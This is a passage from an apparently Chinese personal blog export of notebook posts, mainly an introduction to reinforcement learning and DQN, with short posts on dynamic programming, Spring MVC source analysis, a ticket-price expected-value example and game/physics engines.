<h3 id="强化学习与马尔科夫决策过程"><a href="#强化学习与马尔科夫决策过程" class="headerlink" title="强化学习与马尔科夫决策过程"></a>强化学习与马尔科夫决策过程</h3><p>MDP基于这样一种假设：未来只取决于当前。</p>
<p>一个状态$S_t$是Markov当且仅当<br>$$P(s_{t+1}|s_t)=P(s_{t+1}|s_t,s_{t-1},…s_1,s_0)$$</p>
<p>P为概率。简单的说就是下一个状态仅取决于当前的状态和当前的动作。注意这里的状态是完全可观察的全部的环境状态（也就是上帝视角）。</p>
<p>增强学习的问题都可以模型化为MDP的问题。</p>
<p>一个基本的MDP可以用（S,A,P）来表示，S表示状态，A表示动作，P表示状态转移概率，也就是根据当前的状态$s_t$和$a_t$转移到$s_{t+1}$的概率。如果我们知道了转移概率P，也就是称为我们获得了模型Model，有了模型，未来就可以求解，那么获取最优的动作也就有可能，这种通过模型来获取最优动作的方法也就称为Model-based的方法。但是现实情况下，很多问题是很难得到准确的模型的，因此就有Model-free的方法来寻找最优的动作。</p>
<h3 id="强化学习的回报Result"><a href="#强化学习的回报Result" class="headerlink" title="强化学习的回报Result"></a>强化学习的回报Result</h3><p>既然一个状态对应一个动作，或者动作的概率，而有了动作，下一个状态也就确定了。这就意味着每个状态可以用一个确定的值来进行描述。可以由此判断一个状态是好的状态还是不好的状态。</p>
<p>状态的好坏其实等价于对未来回报的期望。因此，引入回报Return来表示某个时刻t的状态将具备的回报：</p>
<p>$$G_t = R_{t+1} + \lambda R_{t+2} + … = \sum_{k=0}^\infty\lambda^kR_{t+k+1}$$</p>
<p>上面R是Reward反馈，λ是discount factor折扣因子，一般小于1，就是说一般当下的反馈是比较重要的，时间越久，影响越小。</p>
<p>那么实际上除非整个过程结束，否则显然我们无法获取所有的reward来计算出每个状态的Return，因此，再引入一个概念价值函数Value Function,用value function $v(s)$来表示一个状态未来的潜在价值。</p>
<p>从定义上看，value function就是回报的期望：<br>$$v(s) = \mathbb E[G_t|S_t = s]<br>$$</p>
<p>引出价值函数，对于获取最优的策略Policy这个目标，我们就会有两种方法：</p>
<ul>
<li>直接优化策略$\pi(a|s)$或者$a = \pi(s)$使得回报更高</li>
<li>通过估计value function来间接获得优化的策略。道理很简单，既然我知道每一种状态的优劣，那么我就知道我应该怎么选择了，而这种选择就是我们想要的策略。</li>
</ul>
<p>把值函数展开：</p>
<p>$$\begin{aligned}<br>    v(s) &amp; = \mathbb E[G_t|S_t = s] \\<br>      &amp; = \mathbb E[R_{t+1}+\lambda R_{t+2} + \lambda ^2R_{t+3} + …|S_t = s] \\<br>      &amp; = \mathbb E[R_{t+1}+\lambda (R_{t+2} + \lambda R_{t+3} + …)|S_t = s] \\<br>      &amp; = \mathbb E[R_{t+1} + \lambda G_{t+1}|S_t = s] \\<br>      &amp; = \mathbb E[R_{t+1} + \lambda v(S_{t+1})|S_t = s]<br>\end{aligned}<br>$$</p>
<p>因此：</p>
<p>$$v(s) = \mathbb E[R_{t+1} + \lambda v(S_{t+1})|S_t = s]$$</p>
<p>上面这个公式就是Bellman方程的基本形态。从公式上看，当前状态的价值和下一步的价值以及当前的反馈Reward有关。它表明Value Function是可以通过迭代来进行计算的!!!</p>
<h3 id="Action-Value-function-动作价值函数"><a href="#Action-Value-function-动作价值函数" class="headerlink" title="Action-Value function 动作价值函数"></a>Action-Value function 动作价值函数</h3><p>前面我们引出了价值函数，考虑到每个状态之后都有多种动作可以选择，每个动作之下的状态又多不一样，我们更关心在某个状态下的不同动作的价值。显然。如果知道了每个动作的价值，那么就可以选择价值最大的一个动作去执行了。这就是Action-Value function  $Q^\pi(s,a)$。那么同样的道理，也是使用reward来表示，只是这里的reward和之前的reward不一样，这里是执行完动作action之后得到的reward，之前state对应的reward则是多种动作对应的reward的期望值。显然，动作之后的reward更容易理解。</p>
<p>动作价值函数就为如下表示：<br>$$\begin{aligned}<br>Q^\pi(s,a) &amp; =  \mathbb E[r_{t+1} + \lambda r_{t+2} + \lambda^2r_{t+3} + … |s,a] \\<br>&amp; = \mathbb E_{s^\prime}[r+\lambda Q^\pi(s^\prime,a^\prime)|s,a]<br>\end{aligned}$$</p>
<p>这里要说明的是动作价值函数的定义，加了$\pi$,也就是说是在策略下的动作价值。因为对于每一个动作而已，都需要由策略根据当前的状态生成，因此必须有策略的支撑。而前面的价值函数则不一定依赖于策略。当然，如果定义$v^\pi(s)$则表示在策略$\pi$下的价值。</p>
<h3 id="Optimal-value-function-最优价值函数"><a href="#Optimal-value-function-最优价值函数" class="headerlink" title="Optimal value function 最优价值函数"></a>Optimal value function 最优价值函数</h3><p>能计算动作价值函数是不够的，因为我们需要的是最优策略，现在求解最优策略等价于求解最优的value function，找到了最优的value function，自然而然策略也就是找到。（当然，这只是求解最优策略的一种方法，也就是value-based approach，由于DQN就是value-based，因此这里只讲这部分，以后我们会看到还有policy-based和model-based方法。一个就是直接计算策略函数，一个是估计模型，也就是计算出状态转移函数，从而整个MDP过程得解）</p>
<p>这里以动作价值函数来分析。</p>
<p>首先是最优动作价值函数和一般的动作价值函数的关系：</p>
<p>$$\begin{aligned}<br>Q^<em>(s,a) &amp;= \max_\pi Q^\pi(s,a)\\<br> &amp; = \mathbb E_{s^\prime}[r+\lambda \max _{a^\prime}Q^</em>(s^\prime,a^\prime)|s,a]<br>\end{aligned}<br>$$</p>
<p>也就是最优的动作价值函数就是所有策略下的动作价值函数的最大值。通过这样的定义就可以使最优的动作价值的唯一性，从而可以求解整个MDP。</p>
<p>下面介绍基于Bellman方程的两个最基本的算法，策略迭代和值迭代。</p>
<h3 id="策略迭代Policy-Iteration"><a href="#策略迭代Policy-Iteration" class="headerlink" title="策略迭代Policy Iteration"></a>策略迭代Policy Iteration</h3><p>Policy Iteration的目的是通过迭代计算value function 价值函数的方式来使policy收敛到最优。</p>
<p>Policy Iteration本质上就是直接使用Bellman方程而得到的：</p>
<p>$$<br>\begin{aligned}<br>v_{k+1}(s) &amp;\overset{.}{=} \mathbb E_{\pi}[R_{t+1}+\gamma v <em>{k}(S</em>{t+1})|S_t=s]\\<br>&amp;=\sum_{a}{\pi(a|s)}\sum_{s^\prime,r}{p(s^\prime,r|s,a)[r+\gamma v_k(s^\prime)]}<br>\end{aligned}<br>$$</p>
<p>那么Policy Iteration一般分成两步：</p>
<ol>
<li>Policy Evaluation 策略评估。目的是更新Value Function，或者说更好的估计基于当前策略的价值</li>
<li>Policy Improvement 策略改进。 使用 greedy policy 产生新的样本用于第一步的策略评估。</li>
</ol>
<p align="center">
    <img src="images/policy_iteration.png" width="90%" alt="策略迭代算法示意图"/>
</p>
<center>图4 策略迭代算法示意图</center>

<p>本质上就是使用当前策略产生新的样本，然后使用新的样本更好的估计策略的价值，然后利用策略的价值更新策略，然后不断反复。理论可以证明最终策略将收敛到最优。</p>
<p>具体算法：</p>
<p align="center">
    <img src="images/policy_iteration_method.png" width="90%" alt="策略迭代算法"/>
</p>
<center>图5 策略迭代算法</center>

<p>那么这里要注意的是policy evaluation部分。这里的迭代很重要的一点是需要知道state状态转移概率p。也就是说依赖于model模型。而且按照算法要反复迭代直到收敛为止。所以一般需要做限制。比如到某一个比率或者次数就停止迭代。那么需要特别说明的是不管是策略迭代还是值迭代都是在理想化的情况下（上帝视角）推导出来的算法，本质上并不能直接应用，因为依赖Model。</p>
<h3 id="Value-Iteration-价值迭代"><a href="#Value-Iteration-价值迭代" class="headerlink" title="Value Iteration 价值迭代"></a>Value Iteration 价值迭代</h3><p>Value Iteration则是使用Bellman 最优方程得到:<br>$$<br>\begin{aligned}<br>v_{<em>}(s) &amp; = \max_{a} \mathbb E_{\pi}[R_{t+1}+\gamma v _{</em>}(S_{t+1})|S_t=s,A_t=a]\\<br>&amp; = \max_{a} \sum_{s^\prime,r}p(s^\prime,r|s,a)[r+\gamma v_*(s^\prime)]<br>\end{aligned}<br>$$</p>
<p>然后改变成迭代形式:</p>
<p>$$<br>\begin{aligned}<br>v_{k+1}(s) &amp;\overset{.}{=} \max_{a} \mathbb E_{\pi}[R_{t+1}+\gamma v <em>{k}(S</em>{t+1})|S_t=s,A_t=a]\\<br>&amp; = \max_{a} \sum_{s^\prime,r}p(s^\prime,r|s,a)[r+\gamma v_k(s^\prime)]<br>\end{aligned}<br>$$</p>
<p>value iteration的算法如下：</p>
<p align="center">
    <img src="images/value_iteration.png" width="90%" alt="值迭代算法"/>
</p>
<center>图6 值迭代算法</center>

<p>Policy Iteration和Value Iteration有什么本质区别？</p>
<p>policy iteration使用bellman方程来更新value，最后收敛的value 即$v_\pi$是当前policy下的value值（所以叫做对policy进行评估），目的是为了后面的policy improvement得到新的policy。</p>
<p>而value iteration是使用bellman 最优方程来更新value，最后收敛得到的value即$v_*$就是当前state状态下的最优的value值。因此，只要最后收敛，那么最优的policy也就得到的。因此这个方法是基于更新value的，所以叫value iteration。</p>
<p>从上面的分析看，value iteration较之policy iteration更直接。不过问题也都是一样，需要知道状态转移函数p才能计算。本质上依赖于模型，而且理想条件下需要遍历所有的状态，这在稍微复杂一点的问题上就基本不可能了。</p>
<h3 id="Q-Learning"><a href="#Q-Learning" class="headerlink" title="Q-Learning"></a>Q-Learning</h3><p>Q Learning的思想完全根据value iteration得到。但要明确一点是value iteration每次都对所有的Q值更新一遍，也就是所有的状态和动作。但事实上在实际情况下我们没办法遍历所有的状态，还有所有的动作，我们只能得到有限的系列样本。因此，只能使用有限的样本进行操作。那么，怎么处理？Q Learning提出了一种更新Q值的办法：</p>
<p>$$Q(S_{t},A_{t}) \leftarrow Q(S_{t},A_{t})+\alpha({R_{t+1}+\lambda \max <em>aQ(S</em>{t+1},a)} - Q(S_t,A_t))$$</p>
<p>虽然根据value iteration计算出target Q值，但是这里并没有直接将这个Q值（是估计值）直接赋予新的Q，而是采用渐进的方式类似梯度下降，朝target迈近一小步，取决于α,这就能够减少估计误差造成的影响。类似随机梯度下降，最后可以收敛到最优的Q值。</p>
<p>具体的算法如下：</p>
<p align="center">
    <img src="images/qlearning.png" width="90%" alt="Q学习算法"/>
</p>
<center>图7 Q学习算法</center>

<h3 id="Exploration-and-Exploitation-探索与利用"><a href="#Exploration-and-Exploitation-探索与利用" class="headerlink" title="Exploration and Exploitation 探索与利用"></a>Exploration and Exploitation 探索与利用</h3><p>回到policy的问题，那么要选择怎样的policy来生成action呢？有两种做法：</p>
<ul>
<li><p>随机的生成一个动作</p>
</li>
<li><p>根据当前的Q值计算出一个最优的动作，这个policy\pi称之为greedy policy贪婪策略。也就是</p>
</li>
</ul>
<p>$$\pi(S_{t+1}) = arg\max <em>aQ(S</em>{t+1},a)$$</p>
<p>使用随机的动作就是exploration，也就是探索未知的动作会产生的效果，有利于更新Q值，获得更好的policy。而使用greedy policy也就是target policy则是exploitation，利用policy，这个相对来说就不好更新出更好的Q值，但可以得到更好的测试效果用于判断算法是否有效。</p>
<p>将两者结合起来就是所谓的$\epsilon-greedy$策略，$\epsilon$一般是一个很小的值，作为选取随机动作的概率值。可以更改$\epsilon$的值从而得到不同的exploration和exploitation的比例。</p>
<p>这里需要说明的一点是使用$\epsilon-greedy$策略是一种极其简单粗暴的方法，对于一些复杂的任务采用这种方法来探索未知空间是不可取的。因此，最近有越来越多的方法来改进这种探索机制。</p>
<h2 id="深度强化学习"><a href="#深度强化学习" class="headerlink" title="深度强化学习"></a>深度强化学习</h2><p>深度强化学习始于DeepMind在NIPS 2013上发表的Playing Atari with Deep Reinforcement Learning一文，在该文中第一次提出Deep Reinforcement Learning 这个名称，并且提出DQN（Deep Q-Network）算法，实现从纯图像输入完全通过学习来玩Atari游戏的成果。</p>
<p>之后DeepMind在Nature上发表了改进版的DQN文章Human-level Control through Deep Reinforcement Learning，引起了广泛的关注，Deep Reinfocement Learning 从此成为深度学习领域的前沿研究方向。</p>
<h3 id="维度灾难"><a href="#维度灾难" class="headerlink" title="维度灾难"></a>维度灾难</h3><p>对简单问题可使用表格来表示Q(s,a)，但是这个在现实的很多问题上是几乎不可行的，因为状态实在是太多。使用表格的方式根本存不下。</p>
<p>以计算机玩Atari游戏为例，计算机玩Atari游戏的要求是输入原始图像数据，也就是210x160像素的图片，然后输出几个按键动作。总之就是和人类的要求一样，纯视觉输入，然后让计算机自己玩游戏。那么这种情况下，到底有多少种状态呢？有可能每一秒钟的状态都不一样。因为，从理论上看，如果每一个像素都有256种选择，那么就有：<br>$$<br>256^{210\times 160}<br>$$</p>
<p>这简直是天文数字。所以，我们是不可能通过表格来存储状态的。我们有必要对状态的维度进行压缩，解决办法就是 价值函数近似Value Function Approximation</p>
<h3 id="价值函数近似Value-Function-Approximation"><a href="#价值函数近似Value-Function-Approximation" class="headerlink" title="价值函数近似Value Function Approximation"></a>价值函数近似Value Function Approximation</h3><p>什么是价值函数近似呢？说起来很简单，就是用一个函数来表示Q(s,a)。即<br>$$Q(s,a) = f(s,a)$$</p>
<p>$f$可以是任意类型的函数，比如线性函数：</p>
<p>$$Q(s,a) = w_1s + w_2a + b$$</p>
<p>其中$w_1$,$w_2$,$b$是函数$f$的参数。</p>
<p>通过函数表示，我们就可以无所谓s到底是多大的维度，反正最后都通过矩阵运算降维输出为单值的Q。</p>
<p>这就是价值函数近似的基本思路。</p>
<p>如果我们就用$w$来统一表示函数$f$的参数，那么就有</p>
<p>$$Q(s,a) = f(s,a,w)$$</p>
<p>为什么叫近似，因为我们并不知道Q值的实际分布情况，本质上就是用一个函数来近似Q值的分布，所以，也可以说是</p>
<p>$$Q(s,a)\approx f(s,a,w)$$</p>
<h3 id="Q值神经网络化——DQN算法"><a href="#Q值神经网络化——DQN算法" class="headerlink" title="Q值神经网络化——DQN算法"></a>Q值神经网络化——DQN算法</h3><p>意思很清楚，就是我们用一个深度神经网络来表示这个函数$f$。</p>
<p>以DQN为例，输入是经过处理的4个连续的84x84图像，然后经过两个卷积层，两个全连接层，最后输出包含每一个动作Q值的向量。</p>
<p>神经网络的训练是一个最优化问题，最优化一个损失函数loss function，也就是标签和网络输出的偏差，目标是让损失函数最小化。为此，我们需要有样本，巨量的有标签数据，然后通过反向传播使用梯度下降的方法来更新神经网络的参数。</p>
<p>如何为Q网络提供有标签的样本？答案就是利用Q-Learning算法。目标Q值作为标签，使Q值趋近于目标Q值。于是Q网络训练的损失函数就是：</p>
<p align="center">
    <img src="images/loss_function.png" width="80%" alt="DQN损失函数"/>
</p>
<center>图8 DQN损失函数</center>

<p>上面公式是$s^\prime$, $a^\prime$即下一个状态和动作。这里用了David Silver的表示方式，看起来比较清晰。<br>既然确定了损失函数，也就是cost，确定了获取样本的方式。那么DQN的整个算法也就成型了！</p>
<p>这里分析第一个版本的DQN，也就是NIPS 2013提出的DQN。</p>
<p align="center">
    <img src="images/dqn_method.png" width="90%" alt="DQN算法"/>
</p>
<center>图9 DQN算法</center>

<p>具体的算法主要涉及到Experience Replay，也就是经验池的技巧，就是如何存储样本及采样问题。</p>
<p>由于玩Atari采集的样本是一个时间序列，样本之间具有连续性，如果每次得到样本就更新Q值，受样本分布影响，效果会不好。因此，一个很直接的想法就是把样本先存起来，然后随机采样如何？这就是Experience Replay的意思。按照脑科学的观点，人的大脑也具有这样的机制，就是在回忆中学习。</p>
<p>那么上面的算法看起来那么长，其实就是反复试验，然后存储数据。接下来数据存到一定程度，就每次随机采用数据，进行梯度下降！</p>
<h3 id="DQN的三大改进方法"><a href="#DQN的三大改进方法" class="headerlink" title="DQN的三大改进方法"></a>DQN的三大改进方法</h3><p>大幅度提升DQN玩Atari性能的主要就是Double DQN，Prioritised Replay还有Dueling Network三大方法。</p>
<ul>
<li>Double DQN：目的是减少因为max Q值计算带来的计算偏差，或者称为过度估计（over estimation）问题，用当前的Q网络来选择动作，用目标Q网络来计算目标Q。</li>
<li>Prioritised replay：也就是优先经验的意思。优先级采用目标Q值与当前Q值的差值来表示。优先级高，那么采样的概率就高。</li>
<li>Dueling Network：将Q网络分成两个通道，一个输出V，一个输出A，最后再合起来得到Q。如下图所示（引用自Dueling Network论文）。这个方法主要是idea很简单但是很难想到，然后效果一级棒，因此也成为了ICML的best paper。</li>
</ul>
<h3 id="策略梯度"><a href="#策略梯度" class="headerlink" title="策略梯度"></a>策略梯度</h3><p>Policy Gradient的方法的基本思想是通过评价动作action的好坏，来调整该action的出现概率。最基本的Policy Gradient的损失函数Loss就是：</p>
<p>$$loss = -log(\pi)*Q$$</p>
<p>这里先以Q值来指代对动作的评价。</p>
<h1 id="Robot-Learning的发展路径"><a href="#Robot-Learning的发展路径" class="headerlink" title="Robot Learning的发展路径"></a>Robot Learning的发展路径</h1><p>Robot Learning从目前来看，经过了以下研究思路的发展：</p>
<p>（1）利用传统的控制算法结合深度学习来实现机器人端到端的控制。这个方法主要是以Guided Policy Search（GPS）为首。这个方法是Sergey Levine提出的，通过与传统方法结合，确实可以让机器人学习出一些有意思的技能，但是有个根本问题摆在面前，就是传统方法通常需要知道整个系统的模型，而这在实际的机器人中非常难以适用。就比如四轴飞行器的控制，我们可以通过外部的Vicon设备来精确的定位四轴飞行器的位置，从而实现对其精确控制，但是在户外，我们根本就做不到这点，也就无法精确建模。因此，还依赖传统方法是没有出路的，我们使用深度学习就是要抛弃传统方法的弊端。</p>
<p>（2）深度增强学习DRL。由于DeepMind在DRL取得了巨大成功，而DRL就是面向决策与控制问题，特别适用于机器人，因此想在机器人上使用DRL是一种必然的想法。Google Brain团队（依然以Sergey Levine为首）做出了一些进展，在我们之前的专栏文章中也有分析最前沿 之 谷歌的协作机械臂 - 知乎专栏 。但是在使用DRL之后，DRL的弊端也就显现出来了，那就是需要大量的尝试来获取数据。对于这个问题，在机器人仿真环境还好，但是在真实的机器人上就根本没办法这么做了。为了解决这个问题，也就引出来下面两个研究思路。</p>
<p>（3）迁移学习Transfer Learning。既然在真实环境不行，而仿真环境可以，那么是不是可以先在仿真环境中训练好，再把知识迁移到真实机器人上。Google Deepmind在这一块做了一些不错的工作，提出了Progressive Neural Net和PathNet，验证了迁移的可能性。而且很显然的，仿真环境越真实，迁移效果会越好。那么，搞一个非常仿真的环境就非常有意义了。这不，Nvidia 刚刚推出Isaac机器人模拟系统，确实是对Robot Learning的研究注入了一剂强心剂。</p>
<p>（4）Imitation Learning 模仿学习/Few Shot Learning 少样本学习/ Meta Learning 学会学习。这是另一条思路，那就是尽量减少数据的使用量。我们如果能够教机器人几次机器人就能学会技能那么问题也能解决。而这一块也就是OpenAI (依然是Sergey Levine）那帮人在如火如荼的研究的方向。而且特别是Meta Learning，直指通用人工智能的核心。如果能够在Meta Learning上取得突破，那么本身会是革命性的。</p>
<p>因此，Robot Learning发展到这里，把研究的方向就聚焦到第三和第四点上了，并且也取得了一定的成果，但是显然还有非常多的工作可以去做。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/深度学习" target="_blank" rel="noopener">深度学习</a>, by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21262246?refer=intelligentunit" target="_blank" rel="noopener">DQN 从入门到放弃1 DQN与增强学习</a>, by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21292697?refer=intelligentunit" target="_blank" rel="noopener">DQN 从入门到放弃2 增强学习与MDP</a>, by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21340755?refer=intelligentunit" target="_blank" rel="noopener">DQN 从入门到放弃3 价值函数与Bellman方程</a>, by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21378532" target="_blank" rel="noopener">DQN 从入门到放弃4 动态规划与Q-Learning</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21421729" target="_blank" rel="noopener">DQN从入门到放弃5 深度解读DQN算法</a>, by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21547911" target="_blank" rel="noopener">DQN从入门到放弃6 DQN的各种改进</a>, by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21609472" target="_blank" rel="noopener">DQN从入门到放弃7 连续控制DQN算法-NAF</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/26988866" target="_blank" rel="noopener">最前沿：机器人学习Robot Learning的发展</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/38241764" target="_blank" rel="noopener">简单的交叉熵损失函数，你真的懂了吗？</a>,by 红色石头.</li>
<li><a href="https://en.wikipedia.org/wiki/Markov_decision_process" target="_blank" rel="noopener">Markov decision process</a>,by wikipedia.</li>
<li><a href="https://spinningup.readthedocs.io/zh_CN/latest/spinningup/rl_intro2.html" target="_blank" rel="noopener">openai spinningup</a>,by LJ147.</li>
<li><a href="https://zhuanlan.zhihu.com/p/56399184" target="_blank" rel="noopener">深度强化学习发展史</a>,by JQWang2048.</li>
<li><a href="https://leovan.me/cn/2020/05/introduction-of-reinforcement-learning/" target="_blank" rel="noopener">强化学习简介 (Introduction of Reinforcement Learning)</a>,by 范叶亮.</li>
<li><a href="https://zhuanlan.zhihu.com/p/68391151" target="_blank" rel="noopener">【写在复现之前】强化学习常用算法分类</a>,by Firework.</li>
<li><a href="https://www.leiphone.com/category/academic/y5nyxtWsNUrm37a9.html" target="_blank" rel="noopener">强化学习中无处不在的贝尔曼最优性方程，背后的数学原理知多少？</a>,by 亚希伯恩•菲.</li>
<li><a href="https://zhuanlan.zhihu.com/p/21547911" target="_blank" rel="noopener">DQN从入门到放弃6 DQN的各种改进</a>,by Flood Sung.</li>
<li><a href="https://zhuanlan.zhihu.com/p/113122457" target="_blank" rel="noopener">Dueling DQN</a>,by 小小何先生.</li>
<li><a href="https://chengfeng96.com/blog/2020/02/21/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89-%E7%AD%96%E7%95%A5%E6%A2%AF%E5%BA%A6/" target="_blank" rel="noopener">强化学习笔记（六）- 策略梯度</a>,by Hazza Cheng.</li>
<li><a href="https://www.zhihu.com/question/36849284" target="_blank" rel="noopener">目前，人工智能各个流派发展现状如何？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>最优化算法之动态规划入门</title>
    <url>/2019/02/10/%E6%9C%80%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>动态规划（英语：Dynamic programming，简称DP）是一种在数学、管理科学、计算机科学、经济学和生物信息学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。</p>
<p>动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。</p>
<p>动态规划中包含三个重要子概念：</p>
<ul>
<li>最优子结构</li>
<li>边界</li>
<li>状态转移公式</li>
</ul>
<p>对有重叠子问题和最优子结构性质的问题，在建模之后，即获得其状态转移公式和边界之后，可采用下列算法求解：</p>
<ul>
<li>递归求解</li>
<li>备忘录算法</li>
<li>动态规划求解</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/动态规划" target="_blank" rel="noopener">动态规划</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/31628866" target="_blank" rel="noopener">漫画：什么是动态规划？</a>,by 程序员小灰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>源代码分析的方法</title>
    <url>/2021/03/01/%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>源码分析的目的是讲解代码要解决什么问题、代码如何解决问题的以及代码为什么要这么解决问题。</p>
</blockquote>
<blockquote>
<p>源码分析的入手点是软件而不是源代码。软件（ Software ）是一个宽泛的概念，包括应用程序、工具箱和框架等等。软件可以说是由代码组成的，那么我们强调入手点是软件而不是源代码的原因是什么呢？</p>
</blockquote>
<blockquote>
<p>源码分析从源代码入手，就容易落入具体实现的窠臼当中；而代码构成的软件整体，有其被创造的背景、要解决的问题、演进过程中面临的困难和决策，以及最终所为用户认知的形态。源码分析从软件整体入手，才能够脱离技术人员对技术本身的痴迷的影响，从务实的角度讲解代码要解决什么问题、代码如何解决问题的以及代码为什么要这么解决问题。</p>
</blockquote>
<p>《深入理解 Spring MVC 源代码》的讲解按照目录分成三个部分。</p>
<blockquote>
<p>第一部分主要从使用的角度入手，由开发者最熟悉的功能切入，讲解了基本组件包括控制器、模型和视图在抽象层面上是如何被支持的。在此基础上对 MVC 模型最承担逻辑的控制器展开了详细的介绍，尤其是平时容易被终端开发者忽略的请求是如何进入框架和流程以及返回值是如何交付给请求方的。最后用简短的篇幅简略地介绍了 WebFlux 的发展趋势和一些常见的配置项。</p>
</blockquote>
<blockquote>
<p>第二部分接着从源码切入，首先介绍了源码阅读的一些技术技巧，再对 Spring MVC 框架的启动、MVC 框架请求分发的核心 DispatcherServlet 类的功能、RequestMapping 的查找原理和请求处理方法的执行过程一一进行具体的介绍。每个细节部分也是按照这种主题加解决方法的模式，先抛出一个问题，抽象地讨论解决思路，再结合代码讲解关键细节，最后简略地做完整性补充和扩展讨论。</p>
</blockquote>
<blockquote>
<p>第三部分可以单独拆开来，是在完成了源码分析以后以一个常见的基于 Spring MVC 实现微信公众号快速开发框架的例子来介绍 Spring MVC 的实用过程。通过分析时下热点的具体实例，可以让读者清晰的看到前面所讲的知识点在实践中到底是怎么被运用的，哪些一定会涉及且常常会被实现考虑在内，哪些是在哪种特定情况下会涉及的，以及哪些是平常看不到的或者不需要重点钻研的。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/259593005" target="_blank" rel="noopener">源码分析怎么做？</a>, by tison.</li>
<li><a href="https://www.zhihu.com/question/29765945" target="_blank" rel="noopener">程序员阅读源码是一种什么心态？源码对编程意义何在？如何才能更好阅读代码？</a>,by zhihu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title>生活中的统计学之购买车展黄牛票</title>
    <url>/2018/11/17/%E7%94%9F%E6%B4%BB%E4%B8%AD%E7%9A%84%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%8B%E8%B4%AD%E4%B9%B0%E8%BD%A6%E5%B1%95%E9%BB%84%E7%89%9B%E7%A5%A8/</url>
    <content><![CDATA[<p>前段时间去看车展，一出地铁口，就有黄牛兜售车展门票，只需30元一张，而从车展正规窗口购买需要50元一张，那么买黄牛票还是买正规车展门票呢？</p>
<p>黄牛票有可能是真的，这样我就只需30元就可以参观车展，也有可能是假的，这样我就得花80元才能参观车展。假设黄牛票为真的概率是p<sub>1</sub>，根据概率论的知识，我参观车展花费的期望是：</p>
<p>$$E = 30<em>p_1+80</em>(1-p_1)$$</p>
<p>在没有任何先验知识的前提下，假设黄牛票为真的概率是0.5，于是每次买黄牛票参观车展的花费期望是55，而每次买正规门票参观车展的花费期望是50，因此不建议买黄牛票，而应该去买正规车展门票。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zybuluo.com/codeep/note/163962" target="_blank" rel="noopener">Cmd Markdown 公式指导手册</a></li>
<li><a href="http://jzqt.github.io/2015/06/30/Markdown中写数学公式/" target="_blank" rel="noopener">Markdown中写数学公式</a></li>
</ol>
]]></content>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏引擎与物理引擎</title>
    <url>/2019/09/16/%E6%B8%B8%E6%88%8F%E5%BC%95%E6%93%8E%E4%B8%8E%E7%89%A9%E7%90%86%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<p>游戏引擎提供一系列可视化开发工具和可重用组件。这些工具通过与开发环境进行集成，方便开发者简单、快速进行数据驱动方式的游戏开发。为了提高游戏开发人员的开发效率，引擎开发者会开发出大量的游戏所需要的软件组件。大多数引擎集成了图形、声音、物理和人工智能等功能部件。游戏引擎会被称为“中间件”，因为它们可以提供灵活和重用平台，向游戏开发者提供所需要的全部核心功能，从而节省大量的游戏开发费用，降低开发的复杂性，缩短游戏的上市时间，所有这些对于高竞争性的游戏产业来说都是关键因素。诸如虚幻系列引擎、Unity3D、Frostbite Engine、zerodin引擎、Doom3引擎、CryENGINE、3DGame Studio、RenderWare、Gamebryo、Virtools以及Source引擎等引擎。</p>
<p>物理引擎是一个计算机程序模拟牛顿力学模型，使用质量、速度、摩擦力和空气阻力等变量。可以用来预测这种不同情况下的效果。它主要用在计算物理学和电子游戏以及计算机动画当中。物理引擎可作为游戏引擎的一个组件。</p>
<p>物理引擎有两种类型常见的型类：实时物理引擎和高精度物理引擎。高精度的物理引擎需要更多的处理能力来计算非常精确的物理，通常使用在科学研究（计算物理学）和计算机动画电影制作。实时物理引擎使用通常使用在电子游戏并且简化运算，降低精确度增以减少计算时间，得到在电子游戏当中可以接受的的处理速度。常用的物理引擎有：ODE、Box2D、PhysX、Bullet、Havok引擎。</p>
<h1 id="游戏主循环"><a href="#游戏主循环" class="headerlink" title="游戏主循环"></a>游戏主循环</h1><p>FPS(Frame Per Second)游戏帧速60帧是指游戏每秒循环更新60次。  </p>
<p>一个游戏程序的基本结构像是这样:</p>
